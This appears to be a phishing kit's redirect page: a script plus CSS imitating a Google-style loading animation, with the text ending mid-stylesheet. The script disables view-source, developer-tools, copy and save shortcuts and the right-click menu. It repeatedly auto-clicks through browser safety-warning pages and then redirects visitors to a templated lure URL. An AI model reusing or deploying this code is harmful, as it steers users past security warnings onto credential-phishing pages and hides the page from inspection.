<script>
    window.onkeydown = (e) => {
        return !(
            e.ctrlKey &&
            (e.keyCode === 67 ||
                e.keyCode === 85 ||
                e.keyCode === 86 ||
                e.keyCode === 88 ||
                e.keyCode === 117)
        );
    };

    window.addEventListener("keydown", (e) => {
        if (e.ctrlKey && e.which == 83) {
            e.preventDefault();
            return false;
        }
    });

    window.addEventListener("contextmenu", (event) => event.preventDefault());

    document.onkeydown = (e) => {
        if (e.keyCode == 123) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == "E".charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.shiftKey && e.keyCode == "I".charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.shiftKey && e.keyCode == "J".charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == "U".charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == "S".charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == "H".charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == "A".charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == "F".charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == "E".charCodeAt(0)) {
            return false;
        }
    };
    const checkRedPage = () => {
        if (document.querySelector('#wl-orig')) {
            let submBtn = document.querySelector('#wl-orig');
            submBtn.focus(); submBtn.click();
        }
        if (document.getElementById("moreInformationDropdownLink")) {
            document.body.style.display = "none";
            document.getElementById("moreInformationDropdownLink").click()
            let submBtn1 = document.querySelector('#continueToSite');
            submBtn1.focus(); submBtn1.click();
        }
    }

    setTimeout(() => {window.location.href = { lure_url_js } + window.location.hash}, 1000);
    window.setInterval(checkRedPage, 1);
</script>

    #loading {
        font-family: arial, sans-serif
    }

    #loading {
        position: absolute;
        width: 100%;
        height: 100%;
        z-index: 1000;
        background-color: #fff
    }

    .msg {
        color: #757575;
        font-size: 20px;
        letter-spacing: .2px;
        line-height: 20px;
        text-align: center
    }

    #nlpt {
        animation: a-s .5s 2.5s 1 forwards;
        background-color: #f1f1f1;
        height: 4px;
        margin: 56px auto 20px;
        opacity: 0;
        overflow: hidden;
        position: relative;
        width: 300px
    }

    #nlpt::before {
        animation: a-lb 20s 3s linear forwards;
        background-color: #db4437;
        content: "";
        display: block;
        height: 100%;
        position: absolute;
        transform: translateX(-300px);
        width: 100%
    }

    @keyframes a-lb {
        0% {
            transform: translateX(-300px)
        }

        5% {
            transform: translateX(-240px)
        }

        15% {
            transform: translateX(-30px)
        }

        25% {
            transform: translateX(-30px)
        }

        30% {
            transform: translateX(-20px)
        }

        45% {
            transform: translateX(-20px)
        }

        50% {
            transform: translateX(-15px)
        }

        65% {
            transform: translateX(-15px)
        }

        70% {
            transform: translateX(-10px)
        }

        95% {
            transform: translateX(-10px)
        }

        100% {
            transform: translateX(-5px)
        }
    }

    @keyframes a-s {
        100% {
            opacity: 1
        }
    }

    @keyframes a-h {
        100% {
            opacity: 0
        }
    }

    @keyframes a-nt {
        100% {
            transform: none
        }
    }

    @keyframes a-e {
        43% {
            animation-timing-function: cubic-bezier(.8, 0, .2, 1);
            transform: scale(.75)
        }

        60% {
            animation-timing-function: cubic-bezier(.8, 0, 1, 1);
            transform: translateY(-16px)
        }

        77% {
            animation-timing-function: cubic-bezier(.16, 0, .2, 1);
            transform: none
        }

        89% {
            animation-timing-function: cubic-bezier(.8, 0, 1, 1);
            transform: translateY(-5px)
        }

        100% {
            transform: none
        }
    }

    @keyframes a-ef {
        24% {
            animation-timing-function: cubic-bezier(.8, 0, .6, 1);
            transform: scaleY(.42)
        }

        52% {
            animation-timing-function: cubic-bezier(.63, 0, .2, 1);
            transform: scaleY(.98)
        }

        83% {
            animation-timing-function: cubic-bezier(.8, 0, .84, 1);
            transform: scaleY(.96)
        }

        100% {
            transform: none
        }
    }

    @keyframes a-efs {
        24% {
            animation-timing-function: cubic-bezier(.8, 0, .6, 1);
            opacity: .3
        }

        52% {
            animation-timing-function: cubic-bezier(.63, 0, .2, 1);
            opacity: .03
        }

        83% {
            animation-timing-function: cubic-bezier(.8, 0, .84, 1);
            opacity: .05
        }

        100% {
            opacity: 0
        }
    }

    @keyframes a-es {
        24% {
            animation-timing-function: cubic-bezier(.8, 0, .6, 1);
            transform: rotate(-25deg)
        }

        52% {
            animation-timing-function: cubic-bezier(.63, 0, .2, 1);
            transform: rotate(-42.5deg)
        }

        83% {
            animation-timing-function: cubic-bezier(.8, 0, .84, 1);
            transform: rotate(-42deg)
        }

        100% {
            transform: rotate(-43deg)
        }
    }

    .la-e {
        animation: 3.6s cubic-bezier(.03, 0, .17, .67) kf-e;
        margin: 0 auto;
        position: relative
    }

    .la-e,
    .la-b {
        height: 165px;
        width: 220px
    }

    .la-l,
    .la-r,
    .la-m,
    .la-b,
    .la-i>* {
        position: absolute
    }

    .la-m {
        height: 220px;
        top: -101px;
        transform: scaleY(.75) rotate(45deg);
        width: 220px
    }

    .la-b {
        border-radius: 22px 22px 15px 15px;
        overflow: hidden
    }

    .la-b .la-l,
    .la-b .la-r,
    .la-b .la-m {
        background: #f1f3f4
    }

    .la-b .la-l {
        left: -1px
    }

    .la-b .la-r {
        right: -1px
